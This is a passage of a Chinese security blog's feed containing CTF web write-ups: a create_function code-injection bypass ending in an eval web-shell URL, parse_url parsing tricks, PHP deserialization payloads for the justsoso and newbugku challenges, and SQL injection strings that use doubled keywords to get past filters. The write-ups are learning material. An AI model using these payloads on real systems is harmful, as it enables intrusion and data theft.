alt="image.png"></p><p>可以看到%5c可以bypass正则</p><p>关于为何%5c可以bypass掉正则，出题人有如下解释:</p><blockquote><p>php里默认命名空间是\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。<br>如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</p></blockquote><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>绕过正则后，我们重点来看利用点的函数类型</p><p>函数需要两个参数，我们可以控制其中第二个参数进行getshell</p><p><img src="https://upload-images.jianshu.io/upload_images/13385151-4d90e135d9ee9212.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>这样通过寻找，最终确定了create_function()函数，我们看一下官方文档</p><p><img src="https://upload-images.jianshu.io/upload_images/13385151-c137fb33e8eb007c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>简单解释就是参数$args控制匿名函数的参数，$code控制匿名函数的代码</p><p>我们可以抽象出如下代码模式</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fuction a($args)</span><br><span class="line">&#123;</span><br><span class="line">$code</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不难联想到这样的模式可以通过代码注入的方式来getshell</p><p>然后回归题目，我们看到可控参数在第二个，也就是$code部分，抽象出来的模型是这样的</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fuction a()</span><br><span class="line">&#123;</span><br><span class="line">$code</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后进行构造，我们可以尝试如下的方式来执行phpinfo()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="string">'121'</span>;&#125;phpinfo();<span class="comment">/*)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">?&gt;</span></span><br></pre></td></tr></table></figure><p>本地看一下测试结果</p><p><img src="https://upload-images.jianshu.io/upload_images/13385151-7f6cad87b37c92d3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>至此我们可以构造如下payload</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">action</span>=%<span class="number">5</span>ccreate_function&amp;arg=return <span class="string">'121'</span>;&#125;phpinfo();/*)&#123;</span><br></pre></td></tr></table></figure><p>结果</p><p><img src="https://upload-images.jianshu.io/upload_images/13385151-a483c19b458e9ff0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><p>题目中的的可控参数为第二个，那么当可控参数为第一个的时候我们如何getshell呢？</p><p>题目代码改成这样</p><p><img src="https://upload-images.jianshu.io/upload_images/13385151-d2935ace079d9a59.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>构建利用原型</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">fuction</span> a(<span class="variable">$arg</span>)</span><br><span class="line">&#123;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个时候，我们依然可以参考上面的利用方式，构造如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="string">'yml'</span>;&#125;phpinfo();<span class="comment">/*)&#123;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个时候可构造如下payload</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">action</span>=%<span class="number">5</span>ccreate_function&amp;arg=)&#123;return <span class="string">'yml'</span>;&#125;phpinfo();/*</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/13385151-23fc39727c1336d8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>成功实现代码执行</p><h1 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h1><p>可以代码执行后我们就可以使用eval函数来利用了</p><pre><code>http://119.3.232.233:8087/?action=%5ccreate_function&amp;arg=return &apos;121&apos;;}eval($_POST[&apos;a&apos;]);/*){</code></pre><p>工具连接</p><p><img src="https://upload-images.jianshu.io/upload_images/13385151-93069e3024251492.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="12.jpg"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本篇属于我的代码审计学习系列&lt;/p&gt;
&lt;h1 id=&quot;function&quot;&gt;&lt;a href=&quot;#function&quot; class=&quot;headerlink&quot; title=&quot;function&quot;&gt;&lt;/a&gt;function&lt;/h1&gt;&lt;p&gt;题目代码：&lt;/p&gt;
&lt;figure class=
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>置顶-个人备忘笔记</title>
    <link href="https://yml-sec.top/2019/05/06/%E7%BD%AE%E9%A1%B6-%E4%B8%AA%E4%BA%BA%E5%A4%87%E5%BF%98%E7%AC%94%E8%AE%B0/"/>
    <id>https://yml-sec.top/2019/05/06/%E7%BD%AE%E9%A1%B6-%E4%B8%AA%E4%BA%BA%E5%A4%87%E5%BF%98%E7%AC%94%E8%AE%B0/</id>
    <published>2019-05-06T11:47:17.000Z</published>
    <updated>2019-05-20T14:08:11.437Z</updated>
    
    <content type="html"><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="输入密码，查看文章" />    <label for="pass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      个人知识点备忘录
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>parse_url-的一些tricks</title>
    <link href="https://yml-sec.top/2019/05/05/parse-url-%E7%9A%84%E4%B8%80%E4%BA%9Btricks/"/>
    <id>https://yml-sec.top/2019/05/05/parse-url-%E7%9A%84%E4%B8%80%E4%BA%9Btricks/</id>
    <published>2019-05-05T14:40:06.000Z</published>
    <updated>2019-05-05T14:40:50.956Z</updated>
    
    <content type="html"><![CDATA[<h1 id="无协议报错"><a href="#无协议报错" class="headerlink" title="无协议报错"></a>无协议报错</h1><pre><code>&lt;?php $url = $_GET[&apos;url&apos;];$data = parse_url($url); var_dump($data);?&gt;</code></pre><p>该函数在URL没有协议的时候，加上端口会报错</p><p><img src="https://i.loli.net/2019/05/05/5ccee953b07e7.jpg" alt="7.jpg"></p><p>不加端口会正常进行解析</p><p><img src="https://i.loli.net/2019/05/05/5cceec50ad422.jpg" alt="10.jpg"></p><p>其他情况下可以正常解析</p><p><img src="https://i.loli.net/2019/05/05/5ccee9d7a9c4c.jpg" alt="8.jpg"></p><p>当端口有字母时，依然会正常解析</p><p><img src="https://i.loli.net/2019/05/05/5cceeae257bb3.jpg" alt="9.jpg"></p><h1 id="端口错误解析"><a href="#端口错误解析" class="headerlink" title="端口错误解析"></a>端口错误解析</h1><p>url为</p><pre><code>http://127.0.0.1/demo1.php?url=//yml-sec.top/index:80</code></pre><p>我们期望的解析结果是这样的</p><p><img src="https://i.loli.net/2019/05/05/5cceeda58c8ba.jpg" alt="12.jpg"></p><p>而实际的解析结果是这样的</p><p><img src="https://i.loli.net/2019/05/05/5cceecebaf5bd.jpg" alt="11.jpg"></p><h1 id="路径解析错误"><a href="#路径解析错误" class="headerlink" title="路径解析错误"></a>路径解析错误</h1><pre><code>http://127.0.0.1/demo1.php?url=//yml-sec.top?/index/config.php</code></pre><p>解析结果</p><p><img src="https://i.loli.net/2019/05/05/5ccef121bd1e1.jpg" alt="13.jpg"></p><pre><code>http://127.0.0.1/demo1.php?url=/yml-sec.top?/index/config.php</code></pre><p>解析结果</p><p><img src="https://i.loli.net/2019/05/05/5ccef1c13eb10.jpg" alt="14.jpg"></p><h1 id="解析返回false"><a href="#解析返回false" class="headerlink" title="///解析返回false"></a>///解析返回false</h1><p>如ciscn题目部分源码</p><pre><code>&lt;?php $payload= $_GET[&apos;url&apos;];if(isset($payload)){      $url = parse_url($_SERVER[&apos;REQUEST_URI&apos;]);    var_dump($url);    parse_str($url[&apos;query&apos;],$query);    foreach($query as $value){        if (preg_match(&quot;/flag/&quot;,$value)) {             die(&apos;stop hacking!&apos;);            exit();        }    }    $payload = unserialize($payload);}else{    echo &quot;Missing parameters&quot;; } ?&gt;</code></pre><p>正常输入会拦截</p><p><img src="https://i.loli.net/2019/05/05/5ccef4faa938d.jpg" alt="15.jpg"></p><p>使用///时会成功的绕过</p><p><img src="https://i.loli.net/2019/05/05/5ccef540be26d.jpg" alt="16.jpg"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;无协议报错&quot;&gt;&lt;a href=&quot;#无协议报错&quot; class=&quot;headerlink&quot; title=&quot;无协议报错&quot;&gt;&lt;/a&gt;无协议报错&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;?php 
$url = $_GET[&amp;apos;url&amp;apos;];
$data = p
      
    
    </summary>
    
    
    
      <category term="tricks" scheme="https://yml-sec.top/tags/tricks/"/>
    
  </entry>
  
  <entry>
    <title>ciscn2019-justsoso涉及知识点总结</title>
    <link href="https://yml-sec.top/2019/05/05/ciscn2019-justsoso%E6%B6%89%E5%8F%8A%E5%8F%8A%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/"/>
    <id>https://yml-sec.top/2019/05/05/ciscn2019-justsoso%E6%B6%89%E5%8F%8A%E5%8F%8A%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/</id>
    <published>2019-05-05T10:47:14.000Z</published>
    <updated>2019-05-05T12:01:28.731Z</updated>
    
    <content type="html"><![CDATA[<p>题目源码：</p><p>index.php</p><pre><code>&lt;html&gt;&lt;?phperror_reporting(0); $file = $_GET[&quot;file&quot;]; $payload = $_GET[&quot;payload&quot;];if(!isset($file)){    echo &apos;Missing parameter&apos;.&apos;&lt;br&gt;&apos;;}if(preg_match(&quot;/flag/&quot;,$file)){    die(&apos;hack attacked!!!&apos;);}@include($file);if(isset($payload)){      $url = parse_url($_SERVER[&apos;REQUEST_URI&apos;]);    parse_str($url[&apos;query&apos;],$query);    foreach($query as $value){        if (preg_match(&quot;/flag/&quot;,$value)) {             die(&apos;stop hacking!&apos;);            exit();        }    }    $payload = unserialize($payload);}else{    echo &quot;Missing parameters&quot;; } ?&gt;&lt;!--Please test index.php?file=xxx.php --&gt;&lt;!--Please get the source of hint.php--&gt;&lt;/html&gt;</code></pre><p>hint.php</p><pre><code>&lt;?php  class Handle{     private $handle;      public function __wakeup(){        foreach(get_object_vars($this) as $k =&gt; $v) {            $this-&gt;$k = null;        }        echo &quot;Waking up\n&quot;;    }    public function __construct($handle) {         $this-&gt;handle = $handle;     }     public function __destruct(){        $this-&gt;handle-&gt;getFlag();    }}class Flag{    public $file;    public $token;    public $token_flag;    function __construct($file){        $this-&gt;file = $file;        $this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000));    }    public function getFlag(){        $this-&gt;token_flag = md5(rand(1,10000));        if($this-&gt;token === $this-&gt;token_flag)        {            if(isset($this-&gt;file)){                echo @highlight_file($this-&gt;file,true);             }          }    }}?&gt;</code></pre><p>先来看hint.php的源代码，我们需要构造反序列化字符串读取到flag.php文件，handle类中调用了getflag方法，而flag类中同样存在getflag方法，在我博客曾写过这么一篇文章</p><p><img src="https://i.loli.net/2019/05/05/5ccec2a4d0025.jpg" alt="1.jpg"></p><p>我们可以通过构造反序列化字符换来调用Flag类中的getflag函数。</p><p>这里涉及到题目的几个注意的点：</p><ol><li>我们需要绕过wakeup函数</li><li>我们还需要想办法对下面的校验进行处理</li></ol><p><img src="https://i.loli.net/2019/05/05/5ccec4ea9ba27.jpg" alt="2.jpg"></p><p>对于wakeup函数的绕过问题，可参考前面的反序列化文章，里面有详细的总结</p><p>源代码中要求token和token_flag值是相等的，对于token和token_flag<br>的比较，这里要熟悉一下PHP中的指针，我们可以将token和token_flag<br>绑定到一个地址上，这样无论我们赋予token什么值，token与<br>token_flag总是相等的</p><p>所以payload我们可以这样写</p><pre><code>&lt;?php  class Handle{     private $handle;      public function __wakeup(){        foreach(get_object_vars($this) as $k =&gt; $v) {            $this-&gt;$k = null;        }        echo &quot;Waking up\n&quot;;    }    public function __construct($handle) {         $this-&gt;handle = $handle;     }     public function __destruct(){        $this-&gt;handle-&gt;getFlag();    }}class Flag{    public $file;    public $token;    public $token_flag;    function __construct($file){        $this-&gt;file = $file;        $this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000));    }    public function getFlag(){        $this-&gt;token_flag = md5(rand(1,10000));        if($this-&gt;token === $this-&gt;token_flag)        {            if(isset($this-&gt;file)){                echo @highlight_file($this-&gt;file,true);             }          }    }}$a = new Flag(&quot;flag.php&quot;);$b = new Handle($a);$a-&gt;token = &quot;yemoli&quot;;$a-&gt;token_flag=&amp;$a-&gt;token;echo serialize($b);?&gt;</code></pre><p>得到如下的payload</p><pre><code>O:6:&quot;Handle&quot;:1:{s:14:&quot;Handlehandle&quot;;O:4:&quot;Flag&quot;:3:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;s:6:&quot;yemoli&quot;;s:10:&quot;token_flag&quot;;R:4;}}</code></pre><p>Handlehandle的长度为12，但是它却显示是14，这是因为成员变量是私有变量，查看源代码发现生成了两个方块一样的不可见字符</p><p><img src="https://i.loli.net/2019/05/05/5ccecac62202d.jpg" alt="3.jpg"></p><p>我们用%00填充即可，同时要注意绕过wakeup</p><p>最后的payload</p><pre><code>O:6:&quot;Handle&quot;:2:{s:14:&quot;%00Handle%00handle&quot;;O:4:&quot;Flag&quot;:3:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;s:6:&quot;yemoli&quot;;s:10:&quot;token_flag&quot;;R:4;}}</code></pre><p>然后我们转过来看index.php</p><p>需要思考的是这一部分</p><p><img src="https://i.loli.net/2019/05/05/5ccecc0aceafc.jpg" alt="4.jpg"></p><p>我们可以利用该函数多个/返回false的特性绕过</p><p>payload </p><pre><code>http://127.0.0.1///?file=hint.php&amp;payload=O:6:&quot;Handle&quot;:2:{s:14:&quot;%00Handle%00handle&quot;;O:4:&quot;Flag&quot;:3:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;s:6:&quot;yemoli&quot;;s:10:&quot;token_flag&quot;;R:4;}}</code></pre><p><img src="https://i.loli.net/2019/05/05/5cced060c54b5.jpg" alt="6.jpg"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;题目源码：&lt;/p&gt;
&lt;p&gt;index.php&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;
&amp;lt;?php
error_reporting(0); 
$file = $_GET[&amp;quot;file&amp;quot;]; 
$payload = $_GET[&amp;quot
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="https://yml-sec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>newbugku部分web题解</title>
    <link href="https://yml-sec.top/2019/04/26/newbugku%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/"/>
    <id>https://yml-sec.top/2019/04/26/newbugku%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/</id>
    <published>2019-04-26T06:38:10.000Z</published>
    <updated>2019-04-26T06:39:00.971Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>题目代码</p><p><img src="https://i.loli.net/2019/04/24/5cc042e715786.png" alt="code.png"></p><p>看到extract函数，联想到常见的变量覆盖漏洞</p><p>根据我以前写的文章</p><p><a href="点击链接" title="https://yml-sec.top/2019/03/31/%E6%B5%85%E8%B0%88%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/">点击链接</a></p><p>可以构造$b为任意值，后面判断了a和c是否相等，可以使用伪协议来做</p><p><img src="https://i.loli.net/2019/04/24/5cc043e5b6134.jpg" alt="18.jpg"></p><h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><p>打开题目显示如下</p><p><img src="https://i.loli.net/2019/04/24/5cc04468e9783.jpg" alt="19.jpg"></p><p>标题为robots,尝试访问robots.txt，访问后提示我们shell.php</p><p>访问shell.php</p><p><img src="https://i.loli.net/2019/04/24/5cc044e078932.jpg" alt="20.jpg"></p><p>这块校验和西湖论剑的留言板题目很像，爆破脚本</p><pre><code>import hashlibdef md5(key):    m = hashlib.md5()    m.update(key.encode(&apos;utf-8&apos;))    return m.hexdigest()for i in range(1000000000):    if md5(str(i))[0:6] == &apos;dc7dc4&apos;:        print(i)        break</code></pre><p>结果如下</p><p><img src="https://i.loli.net/2019/04/24/5cc04592606ed.jpg" alt="21.jpg"></p><p>输入爆破出来的数字即可得到flag</p><p><img src="https://i.loli.net/2019/04/24/5cc045d242c54.jpg" alt="22.jpg"></p><h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><p>提交数据抓包，发现了base64加密的password</p><p><img src="https://i.loli.net/2019/04/24/5cc0496dde0a3.jpg" alt="23.jpg"></p><p>解密后是一个flag,但是提交发现并不正确，仔细观察数据包会发现一个hint</p><pre><code>Hint: Seeing is not believing, maybe you need to be faster!</code></pre><p>尝试将假flag中的字符串当做密码提交</p><p><img src="https://i.loli.net/2019/04/24/5cc04b22f2c91.jpg" alt="24.jpg"></p><p>提示我们要快一些，这样写脚本就可以了</p><pre><code>import requestsimport base64import reurl = &quot;http://123.206.31.85:10013/index.php&quot;s = requests.session()html = s.post(url,data={&quot;password&quot;:&quot;123456&quot;})#print(html.text)password1 = html.headers[&apos;password&apos;]password2 = base64.b64decode(password1)re_str = re.compile(&apos;flag{(.*?)}&apos;,re.S)password = re.findall(re_str,str(password2))print(password[0])html = s.post(url,data={&quot;password&quot;:password[0]})print(html.text)</code></pre><p><img src="https://i.loli.net/2019/04/24/5cc04d9db966e.jpg" alt="25.jpg"></p><h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><p>题目是一道sql注入，过滤了and or select union 这些可用双写绕过</p><p>判断列数</p><pre><code>http://123.206.31.85:10018/list.php?id=2&apos; oorrder by 3--+</code></pre><p><img src="https://i.loli.net/2019/04/24/5cc06384e1735.jpg" alt="27.jpg"></p><p>在判断为4时页面无返回</p><p>所以我们得到列数为3</p><p>查询数据库名</p><pre><code>http://123.206.31.85:10018/list.php?id=-2&apos; uniounionn selecselectt 1,database(),3--+</code></pre><p><img src="https://i.loli.net/2019/04/24/5cc0641c8b186.jpg" alt="28.jpg"></p><p>查询表名</p><pre><code>http://123.206.31.85:10018/list.php?id=-2&apos; uniounionn selecselectt 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema=&apos;web18&apos;--+</code></pre><p><img src="https://i.loli.net/2019/04/24/5cc0657ba5f3e.jpg" alt="29.jpg"></p><p>查询列名</p><pre><code>http://123.206.31.85:10018/list.php?id=-2&apos; uniounionn selecselectt 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_name=&apos;flag&apos;--+</code></pre><p><img src="https://i.loli.net/2019/04/24/5cc0663506a9b.jpg" alt="30.jpg"></p><p>获取flag</p><pre><code>http://123.206.31.85:10018/list.php?id=-2&apos; uniounionn selecselectt 1,flag,3 from flag--+</code></pre><p><img src="https://i.loli.net/2019/04/24/5cc0669a05155.jpg" alt="31.jpg"></p><h2 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h2><p>题目如下</p><p><img src="https://i.loli.net/2019/04/25/5cc18d8d55db0.jpg" alt="32.jpg"></p><p>常规编写脚本即可，key=密文</p><pre><code>import requestsimport rewhile(1):    url = &quot;http://123.206.31.85:10020/&quot;    s = requests.session()    html = s.get(url)    re1 = re.compile(&apos;¼(.*?)&lt;br/&gt;&apos;,re.S)    result = re.findall(re1,html.text)    url2 = url+&quot;?key=&quot;+result[0]    html1 = s.get(url2)    print(html1.text)</code></pre><p>有一点要注意，这题目的flag是有几率出现的，需要多跑几次</p><p><img src="https://i.loli.net/2019/04/25/5cc18e0b63f2c.jpg" alt="33.jpg"></p><h2 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h2><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>定位到上传界面</p><p><img src="https://i.loli.net/2019/04/25/5cc19184715ef.jpg" alt="34.jpg"></p><p>观察链接联想到文件包含漏洞，可以使用伪协议读取</p><p>用扫描器扫描发现flag.php文件，开始利用伪协议读取</p><p><img src="https://i.loli.net/2019/04/25/5cc191e2f32ce.jpg" alt="35.jpg"></p><p>解密后得到flag</p><p><img src="https://i.loli.net/2019/04/25/5cc191fa729ea.jpg" alt="36.jpg"></p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>题目是一个登录框，尝试使用万能密码登录</p><p><img src="https://i.loli.net/2019/04/25/5cc1926b02693.jpg" alt="37.jpg"></p><p>提交后竟然登录成功。。。。。</p><p><img src="https://i.loli.net/2019/04/25/5cc192c3dc749.jpg" alt="38.jpg"></p><h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><p>提示vim编辑器，想到临时文件swp</p><p>输入swp提交</p><p><img src="https://i.loli.net/2019/04/25/5cc1a47da8241.jpg" alt="40.jpg"></p><p>将1改为i成功解出题目</p><p><img src="https://i.loli.net/2019/04/25/5cc1a4a1e19b4.jpg" alt="39.jpg"></p><h2 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h2><h2 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h2><p>访问题目查看源码</p><p><img src="https://i.loli.net/2019/04/25/5cc1ac3771ed1.jpg" alt="41.jpg"></p><p>读取class.php的源码</p><p><img src="https://i.loli.net/2019/04/25/5cc1ac1f0c97c.jpg" alt="42.jpg"></p><pre><code>&lt;?phperror_reporting(E_ALL &amp; ~E_NOTICE);class Read{//f1a9.php    public $file;    public function __toString(){        if(isset($this-&gt;file)){            echo file_get_contents($this-&gt;file);            }        return &quot;__toString was called!&quot;;    }}?&gt;</code></pre><p>提示我们有f1a9.php，这段代码可用反序列化利用</p><pre><code>&lt;?phperror_reporting(E_ALL &amp; ~E_NOTICE);class Read{//f1a9.php    public $file = &quot;f1a9.php&quot;;    public function __toString(){        if(isset($this-&gt;file)){            echo file_get_contents($this-&gt;file);            }        return &quot;__toString was called!&quot;;    }}$a = new Read;echo serialize($a);?&gt;</code></pre><p><img src="https://i.loli.net/2019/04/25/5cc1acf962c35.jpg" alt="43.jpg"></p><p>最后payload</p><p><img src="https://i.loli.net/2019/04/25/5cc1ad233962e.jpg" alt="44.jpg"></p><h2 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h2><p>题目主页面如下</p><p><img src="https://i.loli.net/2019/04/25/5cc1b2ac58ffb.jpg" alt="46.jpg"></p><p>使用扫面器扫出如下页面</p><p><img src="https://i.loli.net/2019/04/25/5cc1b3ac65c31.jpg" alt="47.jpg"></p><p>readme.txt有如下提示</p><p><img src="https://i.loli.net/2019/04/25/5cc1b3d535e60.jpg" alt="48.jpg"></p><p>用户名是admin 密码是三位数字，我们可以用burp爆破</p><p><img src="https://i.loli.net/2019/04/25/5cc1b412448b6.jpg" alt="49.jpg"></p><p>成功登陆后得到flag</p><p><img src="https://i.loli.net/2019/04/25/5cc1b4375909b.jpg" alt="45.jpg"></p><h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>注册登陆后，提示权限不够</p><p><img src="https://i.loli.net/2019/04/25/5cc1b57d73424.jpg" alt="50.jpg"></p><p>尝试抓包</p><p><img src="https://i.loli.net/2019/04/25/5cc1b5ccba3f9.jpg" alt="51.jpg"></p><p>看到u和r的前几位是一样的，后面不一样的部分像是MD5加密后的字符串</p><p>在线解了一下</p><p><img src="https://i.loli.net/2019/04/25/5cc1b64eddc0b.jpg" alt="52.jpg"></p><p>尝试把两个部分都换成admin的MD5加密字符串</p><p><img src="https://i.loli.net/2019/04/25/5cc1b7a097603.jpg" alt="53.jpg"></p><p>得到FLAG</p><h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><p>题目如下</p><p><img src="https://i.loli.net/2019/04/25/5cc1b87d4de7b.jpg" alt="54.jpg"></p><p>查看源码</p><p><img src="https://i.loli.net/2019/04/25/5cc1b8c2a2254.jpg" alt="55.jpg"></p><pre><code>class Time{    public $flag = ******************;    public $truepassword = ******************;    public $time;    public $password ;    public function __construct($tt, $pp) {    $this-&gt;time = $tt;    $this-&gt;password = $pp;    }    function __destruct(){        if(!empty($this-&gt;password))        {            if(strcmp($this-&gt;password,$this-&gt;truepassword)==0){                echo &quot;&lt;h1&gt;Welcome,you need to wait......&lt;br&gt;The flag will become soon....&lt;/h1&gt;&lt;br&gt;&quot;;                if(!empty($this-&gt;time)){                    if(!is_numeric($this-&gt;time)){                        echo &apos;Sorry.&lt;br&gt;&apos;;                        show_source(__FILE__);                    }                    else if($this-&gt;time &lt; 11 * 22 * 33 * 44 * 55 * 66){                        echo &apos;you need a bigger time.&lt;br&gt;&apos;;                    }                    else if($this-&gt;time &gt; 66 * 55 * 44 * 33 * 23 * 11){                        echo &apos;you need a smaller time.&lt;br&gt;&apos;;                    }                    else{                        sleep((int)$this-&gt;time);                        var_dump($this-&gt;flag);                    }                    echo &apos;&lt;hr&gt;&apos;;                }                else{                    echo &apos;&lt;h1&gt;you have no time!!!!!&lt;/h1&gt;&lt;br&gt;&apos;;                }            }            else{                echo &apos;&lt;h1&gt;Password is wrong............&lt;/h1&gt;&lt;br&gt;&apos;;            }        }        else{            echo &quot;&lt;h1&gt;Please input password..........&lt;/h1&gt;&lt;br&gt;&quot;;        }    }    function __wakeup(){        $this-&gt;password = 1; echo &apos;hello hacker,I have changed your password and time, rua!&apos;;    }}if(isset($_GET[&apos;rua&apos;])){    $rua = $_GET[&apos;rua&apos;];    @unserialize($rua);}else{    echo &quot;&lt;h1&gt;Please don&apos;t stop rua 233333&lt;/h1&gt;&lt;br&gt;&quot;;}</code></pre><p>常规的反序列化操作，计算符合条件的时间</p><p><img src="https://i.loli.net/2019/04/25/5cc1bf2dedb6e.jpg" alt="56.jpg"></p><p>exp</p><pre><code>&lt;?phpclass Time{    public $time;    public $password;    public function __construct($tt, $pp) {    $this-&gt;time = $tt;    $this-&gt;password = $pp;    }}$password = array(0=&gt;&apos;yml&apos;);$time = &apos;0x4c06f351&apos;;$yml = new Time($time,$password);echo serialize($yml);?&gt;</code></pre><p>payload</p><p><img src="https://i.loli.net/2019/04/25/5cc1bf9bd56ea.jpg" alt="57.jpg"></p><p>绕过wakeup</p><pre><code>O:4:&quot;Time&quot;:3:{s:4:&quot;time&quot;;s:10:&quot;0x4c06f351&quot;;s:8:&quot;password&quot;;a:1:{i:0;s:3:&quot;yml&quot;;}}</code></pre><p>得到flag</p><p><img src="https://i.loli.net/2019/04/25/5cc1bfed2af41.jpg" alt="58.jpg"></p><h2 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;web1&quot;&gt;&lt;a href=&quot;#web1&quot; class=&quot;headerlink&quot; title=&quot;web1&quot;&gt;&lt;/a&gt;web1&lt;/h2&gt;&lt;p&gt;题目代码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2019/04/24/5cc042e715
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="https://yml-sec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Z3简介及在逆向领域的应用</title>
    <link href="https://yml-sec.top/2019/04/14/Z3%E7%AE%80%E4%BB%8B%E5%8F%8A%E5%9C%A8%E9%80%86%E5%90%91%E9%A2%86%E5%9F%9F%E7%9A%84%E5%BA%94%E7%94%A8/"/>
    <id>https://yml-sec.top/2019/04/14/Z3%E7%AE%80%E4%BB%8B%E5%8F%8A%E5%9C%A8%E9%80%86%E5%90%91%E9%A2%86%E5%9F%9F%E7%9A%84%E5%BA%94%E7%94%A8/</id>
    <published>2019-04-14T12:48:25.000Z</published>
    <updated>2019-04-14T12:50:42.199Z</updated>
    
